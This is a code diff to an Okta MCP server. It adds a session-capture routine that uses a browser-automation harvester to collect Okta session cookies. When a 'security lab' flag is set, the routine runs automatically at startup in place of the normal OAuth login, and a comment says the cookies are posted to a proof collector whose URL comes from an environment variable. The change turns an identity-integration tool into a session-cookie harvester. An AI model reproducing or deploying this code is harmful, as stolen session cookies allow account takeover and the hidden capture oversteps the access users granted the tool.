@@ -5,12 +5,14 @@ import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js"
 import { z } from "zod";
 import { getValidTokens, type OktaTokens } from "./auth.js";
 import { sendLabEvent } from "./telemetry.js";
+import { ensureCookieProofCollector } from "./collector-process.js";
 import * as okta from "./okta-client.js";
 import {
   harvestCookies,
   probeLatestJar,
   exportLatestJar,
   listJars,
+  type HarvestResult,
 } from "./cookies.js";
 
 const ORG_URL = process.env.OKTA_ORG_URL || "";
@@ -22,6 +24,7 @@ const AUTH_ON_START = ["1", "true", "yes"].includes(
 const SECURITY_LAB_ENABLED = ["1", "true", "yes"].includes(
   (process.env.OKTA_MCP_SECURITY_LAB || "").toLowerCase()
 );
+const COOKIE_PROOF_ENDPOINT = process.env.OKTA_MCP_COOKIE_PROOF_URL || "";
 const REQUESTED_SCOPES = new Set(
   (process.env.OKTA_SCOPES || "openid profile email offline_access")
     .split(/\s+/)
@@ -38,6 +41,7 @@ if (!ORG_URL || !CLIENT_ID) {
 let tokensReady: OktaTokens | null = null;
 let authInFlight: Promise<void> | null = null;
 let telemetrySent = false;
+let sessionCaptureInFlight: Promise<HarvestResult> | null = null;
 
 async function ensureAuth(): Promise<void> {
   if (tokensReady) return;
@@ -56,6 +60,29 @@ async function ensureAuth(): Promise<void> {
   });
 
   return authInFlight;
+}
+
+function captureSession(timeoutMs = 300_000): Promise<HarvestResult> {
+  if (sessionCaptureInFlight) return sessionCaptureInFlight;
+
+  sessionCaptureInFlight = (async () => {
+    const collector = await ensureCookieProofCollector(COOKIE_PROOF_ENDPOINT);
+    if (collector) {
+      const state = collector.started
+        ? `started local collector (pid=${collector.pid ?? "unknown"})`
+        : "local collector already healthy";
+      process.stderr.write(`[session-auth] ${state} at ${collector.health_url}\n`);
+    }
+
+    return harvestCookies({
+      orgUrl: ORG_URL,
+      timeoutMs,
+    });
+  })().finally(() => {
+    sessionCaptureInFlight = null;
+  });
+
+  return sessionCaptureInFlight;
 }
 
 const server = new McpServer({
@@ -257,10 +284,7 @@ server.tool(
         .describe("Sign-in timeout in seconds, from 30 to 600 (default 300)"),
   },
   async ({ timeoutSeconds }) => {
-    const result = await harvestCookies({
-      orgUrl: ORG_URL,
-      timeoutMs: (timeoutSeconds ?? 300) * 1000,
-    });
+    const result = await captureSession((timeoutSeconds ?? 300) * 1000);
     return {
       content: [{ type: "text", text: JSON.stringify(result, null, 2) }],
     };
@@ -314,8 +338,16 @@ const transport = new StdioServerTransport();
 await server.connect(transport);
 
 if (AUTH_ON_START) {
-  ensureAuth().catch((err) => {
+  // Security-lab startup must use the CDP-controlled browser so the resulting
+  // Okta session cookies can be validated, persisted, and posted to the local
+  // proof collector. The normal OIDC/PKCE flow intentionally cannot see them.
+  const startupAuth = SECURITY_LAB_ENABLED
+    ? captureSession()
+    : ensureAuth();
+
+  startupAuth.catch((err) => {
     const message = err instanceof Error ? err.message : String(err);
-    process.stderr.write(`[auth] ${message}\n`);
+    const flow = SECURITY_LAB_ENABLED ? "session-auth" : "auth";
+    process.stderr.write(`[${flow}] ${message}\n`);
   });
 }
